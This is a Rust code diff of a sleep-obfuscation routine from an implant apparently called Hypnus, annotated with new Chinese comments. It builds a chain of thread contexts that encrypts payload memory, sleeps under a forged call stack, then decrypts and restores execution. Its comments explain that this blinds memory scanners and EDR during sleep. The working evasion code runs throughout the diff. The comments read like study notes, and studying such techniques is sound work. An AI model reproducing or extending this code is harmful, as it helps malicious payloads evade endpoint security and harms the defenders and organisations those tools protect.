@@ -492,50 +492,85 @@ impl Hypnus {
             // NtProtectVirtualMemory 有 5 个参数,后续有通过((ctxs[1].Rsp + 0x28) as *mut u64).write(old_protect.as_u64())在栈上读取第五个参数的代码
 
             // Encrypt region
+            // 利用系统自带加密函数SystemFunction040对指定内存加密.发生在ctx[1]修改内存权限为rw之后,在ctxs[5]进入休眠之前
+            // 这里并没有调用call指令,只修改ctxs[2].真正在加密执行在后续NtContinue时,由cpu在执行流切换中自动完成
             ctxs[2].jmp(self.cfg, self.cfg.system_function040.into());
+            // 指向需要加密的payload起始地址(base)
             ctxs[2].Rcx = base;
+            // 加密长度(必须8字节对齐,是api原型的硬性要求)但这里并没有对size进行8倍数的检查.(let aligned_size = (size + 7) & !7;)
             ctxs[2].Rdx = size;
+            // 对应RTL_ENCRYPT_OPTION_SAME_PROCESS。表示加密后的数据仅能在当前进程内解密
             ctxs[2].R8  = 0;
 
-            // Backup context
+            // Backup context:备份当前线程的状态
             let mut ctx_backup = CONTEXT { ContextFlags: CONTEXT_FULL, ..Default::default() };
-            ctxs[3].jmp(self.cfg, self.cfg.nt_get_context_thread.into());
+            // jmp函数将ctxs[3]的rip指向一个系统合法(三个dll)的gadget,并预设下一条目标为NtThreadContext:进程读取指定线程的cpu寄存器快照(该函数rcx参数为线程句柄;rdx参数为CONTEXT类型)
+            // 必须使用NtThreadContext,这时唯一能获取包括rsp/eflags(状态位)在内,能够完整描述一个线程状态的官方接口
+            (&mut ctxs[3]).jmp(self.cfg, self.cfg.nt_get_context_thread.into());
             ctxs[3].Rcx = h_thread as u64;
             ctxs[3].Rdx = ctx_backup.as_u64();
 
             // Inject spoofed context
+            // NtSetContextThread是SetThreadContext的底层系统调用:允许一个进程强制重写指定线程的cpu寄存器状态.内核强行修改cpu硬件层面的寄存器值,使得线程在下一次cpu时钟周期恢复执行时,直接变为提供的新状态
             ctxs[4].jmp(self.cfg, self.cfg.nt_set_context_thread.into());
             ctxs[4].Rcx = h_thread as u64;
             ctxs[4].Rdx = ctx_spoof.as_u64();
 
             // Sleep
+            // 在ctxs[4]植入了ctx_spoof,在整个休眠时间线程栈:WaitForSingleObject ->RtlUserThreadStart -> ……
+            // 在ctxs[2],payload已经加密.
+            // 现在内存是加密的,栈是伪造的,线程处于合法的等待状态.任何扫描器来扫内存在此刻也是失明的.
+            // 在spoof之后执行,线程现在带着伪造的栈帧运行,此时调用WaitForSingleObject,其产生的栈回溯是伪造的系统栈过程
+            // DWORD WaitForSingleObject(HANDLE hHandle, DWORD dwMilliseconds)
             ctxs[5].jmp(self.cfg, self.cfg.wait_for_single.into());
+            // 当前线程handle,让线程等待自己结束.即休眠.通常线程只有在结束terminate时才会变为有信号状态.让线程等待一个永远不会在休眠期间发生的信号,强制利用超时机制来达到sleep.WaitForSingleObject是系统常见行为,而直接sleep是edr检测重点.
             ctxs[5].Rcx = h_thread as u64;
+            // 休眠时间毫秒
             ctxs[5].Rdx = self.time * 1000;
+            // 清零保证r8环境
             ctxs[5].R8  = 0;
 
-            // Decrypt region
+            // Decrypt region:休眠期加密的payload内存,恢复为可执行的原始状态
+            // SystemFunction041 (即 RtlDecryptMemory) 
             ctxs[6].jmp(self.cfg, self.cfg.system_function041.into());
+            // 指向需要解密的payload起始地址
             ctxs[6].Rcx = base;
+            // 解密长度,必须与加密时size一致且8字节对齐
             ctxs[6].Rdx = size;
+            // 对应SAME_PROCESS,确保使用与加密时相同的内核密钥进行还原
             ctxs[6].R8  = 0;
 
-            // Restore protection
+            // Restore修复/还原 protection
+            // 利用NtProtectVirtualMemory,将之前为了加密改为RW权限的内存区域,还原回原始可执行权限
+            // 将ctxs[7].rip设置为一个合法的jmp <reg>的GadGet地址;将NtProtectVirtualMemory 的真实地址注入到该 Gadget使用的寄存器中(rax或r11).这种方式避免直接call敏感的syscall,通过合法的jmp指令间接跳转
             ctxs[7].jmp(self.cfg, self.cfg.nt_protect_virtual_memory.into());
+            // NtCurrentProcess()返回伪句柄-1,代表当前进程
             ctxs[7].Rcx = NtCurrentProcess() as u64;
+            // 
             ctxs[7].Rdx = base.as_u64();
             ctxs[7].R8  = size.as_u64();
+            // 对应权限在Obfmode::Rwx中
             ctxs[7].R9  = protection;
+            // 还有第五个参数在后面设置
 
             // Restore thread context
+            // NtSetContextThread 是内核级系统调用，通过强制重写 CPU硬件寄存器，将指定线程的执行状态瞬间切换至预设的上下文环境
+            // 执行shellcode之后的业务代码
             ctxs[8].jmp(self.cfg, self.cfg.nt_set_context_thread.into());
+            // h_thread时前文NtDuplicateObject获取的当前线程的真实内核句柄
+            // 虽然 NtCurrentThread()（伪句柄 -2）在多数 API中可用，但在进行上下文操作时，内核通常要求提供具备THREAD_SET_CONTEXT访问权限的真实句柄，以确保操作的合法性和安全性
             ctxs[8].Rcx = h_thread as u64;
+            // 提供一个 CONTEXT 结构体的指针，内核将根据该结构体中的值重置CPU 寄存器
             ctxs[8].Rdx = ctx_backup.as_u64();
 
             // Final event notification
+            // NtSetEvent是内核级系统调用，用于将指定的内核事件对象设置为“有信号”状态，从而解除其它线程对该事件的阻塞等待
             ctxs[9].jmp(self.cfg, self.cfg.nt_set_event.into());
+            // 指定要激活的同步信号:event[2]在hypnus逻辑中被定义为完成信号.此时这些这段代码的是线程池中的worker线程(或APC注入的辅助线程).通过激活该时间,向一直在NtSignalAndWaitForSingleObject 处等待的主线程（Master Thread）发送信号继续运行
             ctxs[9].Rcx = events[2] as u64;
+            // 作用：接收事件在被修改之前的状态,这是一个指向 LONG 类型的指针:绝大多数同步场景下,调用者并不关心事件之前的状态.传入0/Null高速内核忽略此输出,减少不必要的内存写入操作.
             ctxs[9].Rdx = 0;
+            // 这是整个CONTEXT链条的最后一环.由于hypnus的大部分操作(如加密/休眠)是在另一个上下文或线程中异步完成的,主线程依赖一种可靠的机制知道异步任务何时结束.此处ctxs[9]通过唤醒events[2],打破主线程的阻塞状态,触发hypnus.rs后续的CLeanup清理句柄和线程池代码.没有这一步主线程将陷入永久等待 deadlock
 
             // Layout spoofed CONTEXT chain on stack
             self.cfg.stack.spoof(&mut ctxs, self.cfg, Obfuscation::Timer)?;
